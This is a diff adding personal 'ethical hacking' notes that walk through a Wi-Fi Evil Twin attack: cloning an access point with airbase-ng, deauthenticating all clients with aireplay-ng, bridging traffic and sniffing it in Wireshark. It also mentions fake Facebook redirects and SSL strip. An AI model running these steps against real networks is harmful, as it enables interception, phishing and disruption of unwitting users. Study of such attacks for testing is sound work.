@@ -1,0 +1,59 @@
+PenTesting / Ethical Hacking Notes: 
+
+- TOPIC: Evil Twin: 
+This is a way to have people auth to your machine, and inspect traffic.
+This is also a way to serve content to people. For example redirect facebook.com to another IP with a fake facebook page. 
+
+1. scan the location using monitor mode
+"ifconfig wifi_card down"
+"iwconfig wifi_card monitor"
+"airmon-ng check wifi_card"
+
+from here you will need to kill all the clients that are running. Remember this from the Wireless Hacking notes: 
+- airmon-ng check name_of_wifi_card
+IN ORDER
+- "kill process_number" kill the NETWORK MANAGER if up 
+- "kill process_number" kill the DHCLIENT if up
+- "kill process_number" kill the WPA_SUPPLICANT if up
+Kill the rest in any order you fancy.
+check one more time
+
+2. now scan: 
+"airodump-ng wifi_card"
+
+Authenticated clients will be listed at the bottom
+
+3. next take the MAC address of the access point and run: 
+"airbase-ng -a MAC ADDRESS --essid NAME OF ACCESS POINT -c ACCESS POINT CHANNEL wifi_card"
+your fake access point should now be running.
+
+4. now deauthenticate all users:
+"aireplay-ng -0 0 -a MAC ADDRESS IF ACCESS POINT wifi_card"
+also look into --deauth in the help
+
+5. now look back at the clone log and see if anyone reauthenticated with you.
+
+6. you need to create a bridge on your machine for the client to connected to the internet. 
+install bridge utils: 
+"apt-get install bridge-utils -y"
+
+run the following commands: 
+"brctl addbr evil" - this will add a fake device, note that the name "evil" can be anything you want.
+"brctl addif evil eth0" - this will associate your network interface with the face device
+"brctl addif evil at0" - this will associated the fake device with the interfact for your fake access point
+### bring the devices up ###
+"ifconfig at0 0.0.0.0 up" 
+"ifconfig evil up" - this will bring up the fake device
+"dhclient evil"
+
+7. now the client that is connected to your access point they will have internet access. 
+
+8. Now you can monitor traffic: Look into SSL strip here as well.
+use wireshark for this: 
+"apt-get install wireshark"
+
+launch wireshark and select your fake device: 
+double click on an entry in the list and look at the query information, from there you can see the requested URL
+
+
+
